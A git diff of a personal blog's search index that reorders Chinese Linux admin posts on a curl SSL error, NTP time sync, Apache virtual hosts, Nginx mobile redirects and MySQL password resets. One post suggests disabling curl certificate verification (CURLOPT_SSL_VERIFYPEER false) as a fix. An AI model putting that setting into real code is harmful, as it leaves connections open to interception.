@@ -1,6 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CURL(60)无法获得本地颁发者证书</title>
+    <url>/2017/11/06/10.html</url>
+    <content><![CDATA[<p>今天在部署一个有关微信项目的环境时，访问直接报如下错误：    <code>curl(60)SSL certificate problem：unable to get local issuer certificate.</code></p>
+<a id="more"></a>
+<p>此问题是由于没有配置信任的服务器HTTPS验证。默认，curl被设为不信任任何CA证书，就是不信任任何服务器的验证。因此，浏览器无法通过HTTPS访问你的服务器，而报curl(60)的错误。</p>
+<p><strong>解决方法有2种：</strong></p>
+<ol>
+<li>如果你的内容不敏感，可以在使用curl_exec()之前跳过ssl检查项【因为笔者对这个项目的代码不熟（￣□￣｜｜），所以直接跳过这个方法】</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>下载一个 <a href="https://github.com/bagder/ca-bundle/blob/e9175fec5d0c4d42de24ed6d84a06d504d5e5a09/ca-bundle.crt" target="_blank" rel="noopener">ca-bundle.crt</a> ，放到对应的目录，在php.ini文件中配置下路径，然后重启php【此处不得不感叹一下GitHub真的是大神云集】</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl.cainfo&#x3D;&quot;绝对路径&#x2F;ca-bundle.crt&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>参考文章：<a href="https://www.cnblogs.com/loveyouyou616/p/5513384.html" target="_blank" rel="noopener">https://www.cnblogs.com/loveyouyou616/p/5513384.html</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>LNMP</tag>
+        <tag>一键脚本</tag>
+        <tag>运行环境</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux 10字符串木马病毒</title>
     <url>/2017/09/15/1.html</url>
     <content><![CDATA[<p>今天客户的WAP端注册显示不知名的报错，进入网站查看。可是访问缓慢，于是进入服务器查看情况，结果SSH连接也是十分的卡。等了半天，使用命令查看负载，发现CPU达到了100%，一个10字符串的进程占据了第一的位置。二话不说直接kill掉它，可是立马有生成了另一个10字符串进程。</p>
@@ -68,32 +97,63 @@
       </tags>
   </entry>
   <entry>
-    <title>CURL(60)无法获得本地颁发者证书</title>
-    <url>/2017/11/06/10.html</url>
-    <content><![CDATA[<p>今天在部署一个有关微信项目的环境时，访问直接报如下错误：    <code>curl(60)SSL certificate problem：unable to get local issuer certificate.</code></p>
+    <title>多机部署之使用NTPD服务平滑同步时间</title>
+    <url>/2017/12/24/14.html</url>
+    <content><![CDATA[<p>多机部署中时间的同步是很重要的，当然有人说了搞毛啊ntpdate命令直接同步不就完事了嘛。是的，这样的确可以达到同步时间的效果，但是会有一定的隐患，具体例子这里就不说明了，自行百度。下面就来介绍一下如何使用NTPD服务平滑同步时间。</p>
 <a id="more"></a>
-<p>此问题是由于没有配置信任的服务器HTTPS验证。默认，curl被设为不信任任何CA证书，就是不信任任何服务器的验证。因此，浏览器无法通过HTTPS访问你的服务器，而报curl(60)的错误。</p>
-<p><strong>解决方法有2种：</strong></p>
 <ol>
-<li>如果你的内容不敏感，可以在使用curl_exec()之前跳过ssl检查项【因为笔者对这个项目的代码不熟（￣□￣｜｜），所以直接跳过这个方法】</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+<li><p>检查是否安装NTPD服务</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -q ntp</span><br></pre></td></tr></table></figure>
 
-<ol start="2">
-<li>下载一个 <a href="https://github.com/bagder/ca-bundle/blob/e9175fec5d0c4d42de24ed6d84a06d504d5e5a09/ca-bundle.crt" target="_blank" rel="noopener">ca-bundle.crt</a> ，放到对应的目录，在php.ini文件中配置下路径，然后重启php【此处不得不感叹一下GitHub真的是大神云集】</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl.cainfo&#x3D;&quot;绝对路径&#x2F;ca-bundle.crt&quot;</span><br></pre></td></tr></table></figure>
+<p> 有内容表示已经安装，如果没有，安装命令如下：</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y ntp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置NTP服务为自启动</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chkconfig --list ntpd</span><br></pre></td></tr></table></figure>
 
+<p> 显示如下内容即可</p>
+<blockquote>
+<p>ntpd 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭</p>
+</blockquote>
+</li>
+<li><p>使用ntpdate手动同步时间，免得时间相差太大，让ntpd不能正常同步</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntpdate -u 202.112.10.36</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置内网NTP-Server(192.168.8.109)，文件位置/etc/ntpd.conf，修改部分如下（多的添，原文件默认配置不做删除，不一样的进行修改）</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 允许内网其他机器同步时间</span></span><br><span class="line">restrict 192.168.8.0 mask 255.255.255.0 nomodify notrap</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 中国这边最活跃的时间服务器 : http://www.pool.ntp.org/zone/cn</span></span><br><span class="line">server 210.72.145.44 perfer   # 中国国家受时中心</span><br><span class="line">server 202.112.10.36             # 1.cn.pool.ntp.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> allow update time by the upper server</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许上层时间服务器主动修改本机时间</span></span><br><span class="line">restrict 210.72.145.44 nomodify notrap noquery</span><br><span class="line">restrict 202.112.10.36 nomodify notrap noquery</span><br><span class="line">restrict 59.124.196.83 nomodify notrap noquery</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 外部时间服务器不可用时，以本地时间作为时间服务</span></span><br><span class="line">server  127.127.1.0     # local clock</span><br><span class="line">fudge   127.127.1.0 stratum 10</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重启服务</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/ntpd restart</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看服务连接和监听</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -autlnp | grep ntp</span><br></pre></td></tr></table></figure>
+
+<p> 出现如下即可</p>
+<blockquote>
+<p>udp 0 0 192.168.8.109:123 0.0.0.0:* 23103/ntpd</p>
+</blockquote>
+</li>
+<li><p>配置内网NTP-Clients，修改/etc/ntp.conf文件（此处贴出完整的不带注释的配置文件）</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">driftfile /var/lib/ntp/drift</span><br><span class="line"></span><br><span class="line">restrict 127.0.0.1</span><br><span class="line">restrict -6 ::1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置时间服务器为本地的时间服务器</span></span><br><span class="line">server 192.168.8.109</span><br><span class="line">restrict 192.168.8.109 nomodify notrap noquery</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server  127.127.1.0     # local clock</span><br><span class="line">fudge   127.127.1.0 stratum 10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">includefile /etc/ntp/crypto/pw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keys /etc/ntp/keys</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用ntpdate手动同步下时间</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntpdate -u 192.168.8.109</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>几个命令</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntpq -p #查看网络中的NTP服务器</span><br><span class="line">ntpstat #查看时间同步状态</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
 <hr>
-<p>参考文章：<a href="https://www.cnblogs.com/loveyouyou616/p/5513384.html" target="_blank" rel="noopener">https://www.cnblogs.com/loveyouyou616/p/5513384.html</a></p>
+<p>参考文章：<a href="http://blog.csdn.net/xw_classmate/article/details/50611489" target="_blank" rel="noopener">http://blog.csdn.net/xw_classmate/article/details/50611489</a></p>
 ]]></content>
       <categories>
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>LNMP</tag>
-        <tag>一键脚本</tag>
-        <tag>运行环境</tag>
+        <tag>多机部署</tag>
+        <tag>NTPD</tag>
+        <tag>时间平滑同步</tag>
       </tags>
   </entry>
   <entry>
@@ -257,66 +317,6 @@
       </tags>
   </entry>
   <entry>
-    <title>多机部署之使用NTPD服务平滑同步时间</title>
-    <url>/2017/12/24/14.html</url>
-    <content><![CDATA[<p>多机部署中时间的同步是很重要的，当然有人说了搞毛啊ntpdate命令直接同步不就完事了嘛。是的，这样的确可以达到同步时间的效果，但是会有一定的隐患，具体例子这里就不说明了，自行百度。下面就来介绍一下如何使用NTPD服务平滑同步时间。</p>
-<a id="more"></a>
-<ol>
-<li><p>检查是否安装NTPD服务</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -q ntp</span><br></pre></td></tr></table></figure>
-
-<p> 有内容表示已经安装，如果没有，安装命令如下：</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y ntp</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>配置NTP服务为自启动</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chkconfig --list ntpd</span><br></pre></td></tr></table></figure>
-
-<p> 显示如下内容即可</p>
-<blockquote>
-<p>ntpd 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭</p>
-</blockquote>
-</li>
-<li><p>使用ntpdate手动同步时间，免得时间相差太大，让ntpd不能正常同步</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntpdate -u 202.112.10.36</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>配置内网NTP-Server(192.168.8.109)，文件位置/etc/ntpd.conf，修改部分如下（多的添，原文件默认配置不做删除，不一样的进行修改）</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 允许内网其他机器同步时间</span></span><br><span class="line">restrict 192.168.8.0 mask 255.255.255.0 nomodify notrap</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 中国这边最活跃的时间服务器 : http://www.pool.ntp.org/zone/cn</span></span><br><span class="line">server 210.72.145.44 perfer   # 中国国家受时中心</span><br><span class="line">server 202.112.10.36             # 1.cn.pool.ntp.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> allow update time by the upper server</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许上层时间服务器主动修改本机时间</span></span><br><span class="line">restrict 210.72.145.44 nomodify notrap noquery</span><br><span class="line">restrict 202.112.10.36 nomodify notrap noquery</span><br><span class="line">restrict 59.124.196.83 nomodify notrap noquery</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 外部时间服务器不可用时，以本地时间作为时间服务</span></span><br><span class="line">server  127.127.1.0     # local clock</span><br><span class="line">fudge   127.127.1.0 stratum 10</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>重启服务</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/ntpd restart</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看服务连接和监听</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -autlnp | grep ntp</span><br></pre></td></tr></table></figure>
-
-<p> 出现如下即可</p>
-<blockquote>
-<p>udp 0 0 192.168.8.109:123 0.0.0.0:* 23103/ntpd</p>
-</blockquote>
-</li>
-<li><p>配置内网NTP-Clients，修改/etc/ntp.conf文件（此处贴出完整的不带注释的配置文件）</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">driftfile /var/lib/ntp/drift</span><br><span class="line"></span><br><span class="line">restrict 127.0.0.1</span><br><span class="line">restrict -6 ::1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置时间服务器为本地的时间服务器</span></span><br><span class="line">server 192.168.8.109</span><br><span class="line">restrict 192.168.8.109 nomodify notrap noquery</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server  127.127.1.0     # local clock</span><br><span class="line">fudge   127.127.1.0 stratum 10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">includefile /etc/ntp/crypto/pw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keys /etc/ntp/keys</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用ntpdate手动同步下时间</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntpdate -u 192.168.8.109</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>几个命令</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntpq -p #查看网络中的NTP服务器</span><br><span class="line">ntpstat #查看时间同步状态</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<hr>
-<p>参考文章：<a href="http://blog.csdn.net/xw_classmate/article/details/50611489" target="_blank" rel="noopener">http://blog.csdn.net/xw_classmate/article/details/50611489</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>多机部署</tag>
-        <tag>NTPD</tag>
-        <tag>时间平滑同步</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>多机部署之MySQL主从配置</title>
     <url>/2018/01/01/17.html</url>
     <content><![CDATA[<p>MySQL的主从配置可以让我们很好地减轻数据库的压力而完成更多的业务需求，下面笔者就来介绍一下简单的MySQL主从配置。</p>
@@ -455,31 +455,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Nginx配置--区分PC和WAP访问不同域名</title>
-    <url>/2018/01/13/18.html</url>
-    <content><![CDATA[<p>考虑到网站在多种设备下的兼容性，有很多网站会有手机版和电脑版两个版本。访问同一个网站URL，当服务器识别出用户使用电脑访问，就打开电脑版的页面，如果使用手机访问，就会得到手机版的页面。</p>
-<a id="more"></a>
-<p>要想让网站适配PC和WAP，首先要能做出准确的判断。HTTP请求的Header中的User-Agent可以区分客户端的浏览器类型，可以通过User-Agen来判断客户端的设备。<br><strong>下面举一个PC链接在WAP访问的例子：</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    if ( $http_user_agent ~ "(MIDP)|(WAP)|(UP.Browser)|(Smartphone)|(Obigo)|(Mobile)|(AU.Browser)|(wxd.Mms)|(WxdB.Browser)|(CLDC)|(UP.Link)|(KM.Browser)|(UCWEB)|(SEMC-Browser)|(Mini)|(Symbian)|(Palm)|(Nokia)|(Panasonic)|(MOT-)|(SonyEricsson)|(NEC-)|(Alcatel)|(Ericsson)|(BENQ)|(BenQ)|(Amoisonic)|(Amoi-)|(Capitel)|(PHILIPS)|(SAMSUNG)|(Lenovo)|(Mitsu)|(Motorola)|(SHARP)|(WAPPER)|(LG-)|(LG/)|(EG900)|(CECT)|(Compal)|(kejian)|(Bird)|(BIRD)|(G900/V1.0)|(Arima)|(CTL)|(TDG)|(Daxian)|(DAXIAN)|(DBTEL)|(Eastcom)|(EASTCOM)|(PANTECH)|(Dopod)|(Haier)|(HAIER)|(KONKA)|(KEJIAN)|(LENOVO)|(Soutec)|(SOUTEC)|(SAGEM)|(SEC-)|(SED-)|(EMOL-)|(INNO55)|(ZTE)|(iPhone)|(Android)|(Windows CE)|(Wget)|(Java)|(curl)|(Opera)" ) &#123;</span><br><span class="line">        rewrite ^/(.*)$ http://m.nsxsg.com/wap/$1 last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!-e $request_filename) &#123;</span><br><span class="line">        rewrite  ^/(.*)$  /index.php/$1  last;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>接下来解释一下其中的几个关键点：</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location / &#123;&#125; #匹配所有的请求</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">http_user_agent ~ “(一堆WAP匹配)” <span class="comment">#判断是wap</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">http_user_agent !~ “(一堆WAP匹配)” <span class="comment">#判断不是wap</span></span></span><br><span class="line"></span><br><span class="line">rewrite regex replacement [flag] #rewrite重写，regex正则，replacement替换的内容，flag标志位（详情自行百度这里用last就可以了）</span><br></pre></td></tr></table></figure>
-
-<p>上述内容用一句话概括：</p>
-<blockquote>
-<p>匹配所有请求，如果客户端是wap，重写域名斜杠后面的所有内容为<a href="http://m.nsxsg.com/wap/......，即（类似于把http://www.nsxsg.com/member.html重写为http://m.nsxsg.com/wap/member.html）" target="_blank" rel="noopener">http://m.nsxsg.com/wap/......，即（类似于把http://www.nsxsg.com/member.html重写为http://m.nsxsg.com/wap/member.html）</a></p>
-</blockquote>
-<p>WAP链接在PC访问的具体配置自行修改。</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>NGINX</tag>
-        <tag>配置文件</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>修改MySql数据库密码</title>
     <url>/2017/09/17/2.html</url>
     <content><![CDATA[<p>笔者记性不太好，所以忘记密码是常有的事情。这不连数据库的密码也忘了。下面就来介绍一下如何暴力地修改数据库密码。</p>
@@ -518,6 +493,78 @@
       <tags>
         <tag>数据库</tag>
         <tag>修改密码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu系统下配置Apache虚拟主机</title>
+    <url>/2018/05/24/21.html</url>
+    <content><![CDATA[<p>Ubuntu系统下安装了Apache服务，想要通过IP、域名、端口访问多个Web应用。</p>
+<a id="more"></a>
+<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote>
+<p>此教程适合apt-get install apache2安装的apache</p>
+</blockquote>
+<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ol>
+<li><p>进入配置文件目录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/apache2/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置文件说明</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apache2.conf  #apache总的配置文件</span><br><span class="line">ports.conf    #端口配置文件</span><br><span class="line">sites-enables/000-default.conf    #虚拟主机配置文件</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="配置多个虚拟主机"><a href="#配置多个虚拟主机" class="headerlink" title="配置多个虚拟主机"></a>配置多个虚拟主机</h2><ol>
+<li><p>使用不同的端口访问网站的不同目录</p>
+<ul>
+<li>新增目录 <code>/var/www/html1</code> ,新增文件<code>/var/www/html1/index.php</code>（index.php文件内容自定）</li>
+<li>修改 <code>ports.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Listen 8006</span><br></pre></td></tr></table></figure>
+效果如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdDN0MnhqMzBuNzA4cmpydi5qcGc?x-oss-process=image/format,png" alt=""></li>
+<li>修改 <code>sites-enables/000-default.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> &lt;VirtualHost *:8006&gt;</span><br><span class="line">        ServerName 192.168.0.109</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot /var/www/html1</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error80.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access80.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+内容如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDQuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVxcnYycnZqMzBydTBqZDQwcy5qcGc?x-oss-process=image/format,png" alt=""></li>
+<li>重启apache2<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></li>
+<li>访问 ( IP:8006 ) , 效果如下图<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdGhrcXFqMzBmMzA3Ymdsbi5qcGc?x-oss-process=image/format,png" alt=""></li>
+</ul>
+</li>
+<li><p>使用域名访问网站的不同目录</p>
+<ul>
+<li>修改本地host文件, 自定义一个域名, 指向服务器<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdHRqZ3NqMzBjdzA2N3dlaC5qcGc?x-oss-process=image/format,png" alt=""></li>
+<li>修改 <code>sites-enables/000-default.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> &lt;VirtualHost *:80&gt;</span><br><span class="line">        ServerName abcd.com</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot /var/www/html1</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error801.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access801.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+内容如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVxc2c4bDBqMzBvczBhN2pzYy5qcGc?x-oss-process=image/format,png" alt=""></li>
+<li>访问（<code>http://abcd.com</code>）, 效果如下图<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdTUxdjRqMzBkbTA2ZmdsbC5qcGc?x-oss-process=image/format,png" alt=""></li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
+        <tag>Ubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nginx配置--区分PC和WAP访问不同域名</title>
+    <url>/2018/01/13/18.html</url>
+    <content><![CDATA[<p>考虑到网站在多种设备下的兼容性，有很多网站会有手机版和电脑版两个版本。访问同一个网站URL，当服务器识别出用户使用电脑访问，就打开电脑版的页面，如果使用手机访问，就会得到手机版的页面。</p>
+<a id="more"></a>
+<p>要想让网站适配PC和WAP，首先要能做出准确的判断。HTTP请求的Header中的User-Agent可以区分客户端的浏览器类型，可以通过User-Agen来判断客户端的设备。<br><strong>下面举一个PC链接在WAP访问的例子：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    if ( $http_user_agent ~ "(MIDP)|(WAP)|(UP.Browser)|(Smartphone)|(Obigo)|(Mobile)|(AU.Browser)|(wxd.Mms)|(WxdB.Browser)|(CLDC)|(UP.Link)|(KM.Browser)|(UCWEB)|(SEMC-Browser)|(Mini)|(Symbian)|(Palm)|(Nokia)|(Panasonic)|(MOT-)|(SonyEricsson)|(NEC-)|(Alcatel)|(Ericsson)|(BENQ)|(BenQ)|(Amoisonic)|(Amoi-)|(Capitel)|(PHILIPS)|(SAMSUNG)|(Lenovo)|(Mitsu)|(Motorola)|(SHARP)|(WAPPER)|(LG-)|(LG/)|(EG900)|(CECT)|(Compal)|(kejian)|(Bird)|(BIRD)|(G900/V1.0)|(Arima)|(CTL)|(TDG)|(Daxian)|(DAXIAN)|(DBTEL)|(Eastcom)|(EASTCOM)|(PANTECH)|(Dopod)|(Haier)|(HAIER)|(KONKA)|(KEJIAN)|(LENOVO)|(Soutec)|(SOUTEC)|(SAGEM)|(SEC-)|(SED-)|(EMOL-)|(INNO55)|(ZTE)|(iPhone)|(Android)|(Windows CE)|(Wget)|(Java)|(curl)|(Opera)" ) &#123;</span><br><span class="line">        rewrite ^/(.*)$ http://m.nsxsg.com/wap/$1 last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!-e $request_filename) &#123;</span><br><span class="line">        rewrite  ^/(.*)$  /index.php/$1  last;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>接下来解释一下其中的几个关键点：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location / &#123;&#125; #匹配所有的请求</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">http_user_agent ~ “(一堆WAP匹配)” <span class="comment">#判断是wap</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">http_user_agent !~ “(一堆WAP匹配)” <span class="comment">#判断不是wap</span></span></span><br><span class="line"></span><br><span class="line">rewrite regex replacement [flag] #rewrite重写，regex正则，replacement替换的内容，flag标志位（详情自行百度这里用last就可以了）</span><br></pre></td></tr></table></figure>
+
+<p>上述内容用一句话概括：</p>
+<blockquote>
+<p>匹配所有请求，如果客户端是wap，重写域名斜杠后面的所有内容为<a href="http://m.nsxsg.com/wap/......，即（类似于把http://www.nsxsg.com/member.html重写为http://m.nsxsg.com/wap/member.html）" target="_blank" rel="noopener">http://m.nsxsg.com/wap/......，即（类似于把http://www.nsxsg.com/member.html重写为http://m.nsxsg.com/wap/member.html）</a></p>
+</blockquote>
+<p>WAP链接在PC访问的具体配置自行修改。</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>NGINX</tag>
+        <tag>配置文件</tag>
       </tags>
   </entry>
   <entry>
@@ -566,53 +613,6 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       <tags>
         <tag>shell脚本</tag>
         <tag>定时</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ubuntu系统下配置Apache虚拟主机</title>
-    <url>/2018/05/24/21.html</url>
-    <content><![CDATA[<p>Ubuntu系统下安装了Apache服务，想要通过IP、域名、端口访问多个Web应用。</p>
-<a id="more"></a>
-<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote>
-<p>此教程适合apt-get install apache2安装的apache</p>
-</blockquote>
-<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ol>
-<li><p>进入配置文件目录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/apache2/</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>配置文件说明</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apache2.conf  #apache总的配置文件</span><br><span class="line">ports.conf    #端口配置文件</span><br><span class="line">sites-enables/000-default.conf    #虚拟主机配置文件</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h2 id="配置多个虚拟主机"><a href="#配置多个虚拟主机" class="headerlink" title="配置多个虚拟主机"></a>配置多个虚拟主机</h2><ol>
-<li><p>使用不同的端口访问网站的不同目录</p>
-<ul>
-<li>新增目录 <code>/var/www/html1</code> ,新增文件<code>/var/www/html1/index.php</code>（index.php文件内容自定）</li>
-<li>修改 <code>ports.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Listen 8006</span><br></pre></td></tr></table></figure>
-效果如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdDN0MnhqMzBuNzA4cmpydi5qcGc?x-oss-process=image/format,png" alt=""></li>
-<li>修改 <code>sites-enables/000-default.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> &lt;VirtualHost *:8006&gt;</span><br><span class="line">        ServerName 192.168.0.109</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot /var/www/html1</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error80.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access80.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
-内容如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDQuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVxcnYycnZqMzBydTBqZDQwcy5qcGc?x-oss-process=image/format,png" alt=""></li>
-<li>重启apache2<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></li>
-<li>访问 ( IP:8006 ) , 效果如下图<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdGhrcXFqMzBmMzA3Ymdsbi5qcGc?x-oss-process=image/format,png" alt=""></li>
-</ul>
-</li>
-<li><p>使用域名访问网站的不同目录</p>
-<ul>
